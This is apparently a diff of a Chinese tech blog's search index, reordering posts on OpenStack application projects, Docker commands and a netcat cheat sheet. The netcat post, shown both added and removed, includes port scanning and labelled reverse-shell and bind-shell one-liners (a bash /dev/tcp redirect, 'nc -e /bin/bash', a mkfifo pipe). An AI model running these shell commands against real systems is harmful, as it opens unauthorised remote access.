@@ -2592,53 +2592,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
-      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
-      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
-      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
-<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
-<ul>
-<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
-<ul>
-<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
-</ul>
-</li>
-<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
-<ul>
-<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
-<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
-</ul>
-</li>
-<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
-<ul>
-<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
-</ul>
-</li>
-<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
-<ul>
-<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
-</ul>
-</li>
-<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
-<ul>
-<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
-</ul>
-</li>
-<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
-<ul>
-<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
-</ul>
-</li>
-</ul>
-<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
-<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
-<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
-<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[Going Native with OpenStack Centric Applications: Murano]]></title>
       <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-murano/</url>
       <content type="html"><![CDATA[<p>Following on our previous discussion surveying the projects supporting applications within OpenStack, let’s continue our review with an in-depth look at the OpenStack-native Application Catalog: Murano, currently an incubation status project, having seen its functionality and core services integration advanced over the past few OpenStack releases.</p>
@@ -2756,6 +2709,53 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 </ul>
 <p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-murano/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-murano/</a></p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
+      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
+      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
+<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
+<ul>
+<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
+<ul>
+<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
+</ul>
+</li>
+<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
+<ul>
+<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
+<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
+</ul>
+</li>
+<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
+<ul>
+<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
+</ul>
+</li>
+<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
+<ul>
+<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
+</ul>
+</li>
+<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
+<ul>
+<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
+</ul>
+</li>
+<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
+<ul>
+<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
+</ul>
+</li>
+</ul>
+<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
+<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
+<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
+<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
 ]]></content>
     </entry>
     
@@ -2925,7 +2925,7 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 <li>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<ul>
 <li># 提交指定容器为镜像</li>
-<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x68;&#x61;&#x6e;&#x6e;&#x69;&#x62;&#97;&#108;&#x40;&#97;&#45;&#x74;&#101;&#x61;&#109;&#x2e;&#99;&#x6f;&#109;">&#x68;&#x61;&#x6e;&#x6e;&#x69;&#x62;&#97;&#108;&#x40;&#97;&#45;&#x74;&#101;&#x61;&#109;&#x2e;&#99;&#x6f;&#109;</a>“)</li>
+<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#104;&#97;&#x6e;&#110;&#105;&#98;&#x61;&#108;&#x40;&#97;&#x2d;&#x74;&#101;&#97;&#x6d;&#x2e;&#99;&#111;&#x6d;">&#104;&#97;&#x6e;&#110;&#105;&#98;&#x61;&#108;&#x40;&#97;&#x2d;&#x74;&#101;&#97;&#x6d;&#x2e;&#99;&#111;&#x6d;</a>“)</li>
 <li>-m, —message=””    Commit message</li>
 <li>-p, —pause=true    Pause container during commit<ul>
 <li># 默认 commit 是暂停状态</li>
@@ -3419,6 +3419,29 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
+      <title><![CDATA[Linux netcat examples]]></title>
+      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
+      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[How to use docker compose to deploy a flask app]]></title>
       <url>http://feisky.xyz/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/</url>
       <content type="html"><![CDATA[<p>The flask app is very simple, you have an index page where your can write and read comments.</p>
@@ -3644,29 +3667,6 @@ ADD static/ /www/static
 <p>Now it’s time for my questions.</p>
 <p>Do I miss something ? Or maybe I could make something better ?</p>
 <p>I like to hear your experiences about how to handle Docker orchestration !</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Linux netcat examples]]></title>
-      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
-      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
-<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567</p>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
-<p>Server: nc -l 1567 &lt; file.txt </p>
-<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
-<p>Client to Server:</p>
-<p>Server: nc -l 1567 &gt; file.txt</p>
-<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
-<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
-<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
-<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
-<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
-<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
 ]]></content>
     </entry>
     
@@ -6484,7 +6484,7 @@ neutron router-create --ha=<true |="" false=""> router1
 <p><none>              <none>              e01000c7bac8        6 weeks ago         336.5 MB<br>centos              latest              b157b77b1a65        8 weeks ago         243.7 MB<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"></div><div class="line">其中，镜像<span class="selector-tag">id</span>唯一标识了镜像，<span class="selector-tag">TAG</span>信息用来标记来自同一个仓库的不同镜像。例如<span class="selector-tag">ubuntu</span>仓库中有多个镜像，通过<span class="selector-tag">TAG</span>信息来区分发行版本，例如10<span class="selector-class">.04</span>、12<span class="selector-class">.04</span>、12<span class="selector-class">.10</span>、13<span class="selector-class">.04</span>、14<span class="selector-class">.04</span>等。创建容器时，如果不指定具体的标记，则默认使用<span class="selector-tag">latest</span>标记信息。</div><div class="line"></div><div class="line">除了从容器中下载已有镜像外，也可以根据已有镜像创建新的镜像。创建新镜像有多种方法：</div><div class="line"></div><div class="line">①修改已有镜像后<span class="selector-tag">commit</span></div></pre></td></tr></table></figure></none></none></p>
 <p>$ sudo docker run -t -i ubuntu:12.04 /bin/bash<br>root@a439b6e894bb:/# apt-get update<br>root@a439b6e894bb:/# apt-get install nginx<br>root@a439b6e894bb:/# /etc/init.d/nginx start<br>root@a439b6e894bb:/# exit<br>$ sudo docker commit -m ‘add ngnix’ -a ‘feisky’ a439b6e894bb ubuntu:nginx<br>0a693112c443ce4fb21bc57a26d67f0648b9415e052f929be7e06701f5f3ca2d<br>$ sudo docker images<br>REPOSITORY                               TAG                 IMAGE ID            CREATED             VIRTUAL SIZE<br>ubuntu                                   nginx               0a693112c443        9 seconds ago       153.1 MB<br>ubuntu                                   12.04               0a51fcc173d8        2 days ago          111 MB<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">②用dockerfile来创建镜像</div><div class="line"></div><div class="line">首先创建一个Dockerfile：</div></pre></td></tr></table></figure></p>
 <p>$ cat Dockerfile </p>
-<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x66;&#x65;&#105;&#115;&#x6b;&#x79;&#64;&#114;&#x6f;&#x6f;&#x74;">&#x66;&#x65;&#105;&#115;&#x6b;&#x79;&#64;&#114;&#x6f;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
+<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x66;&#101;&#105;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#116;">&#x66;&#101;&#105;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#116;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
 <h1 id="put-my-local-site-to-var-www"><a href="#put-my-local-site-to-var-www" class="headerlink" title="put my local site to /var/www"></a>put my local site to /var/www</h1><p>ADD index.html /var/www/html/</p>
 <h1 id="expose-httpd-port"><a href="#expose-httpd-port" class="headerlink" title="expose httpd port"></a>expose httpd port</h1><p>EXPOSE 80</p>
 <h1 id="the-command-to-run"><a href="#the-command-to-run" class="headerlink" title="the command to run"></a>the command to run</h1><p>CMD [“/usr/sbin/nginx”]</p>
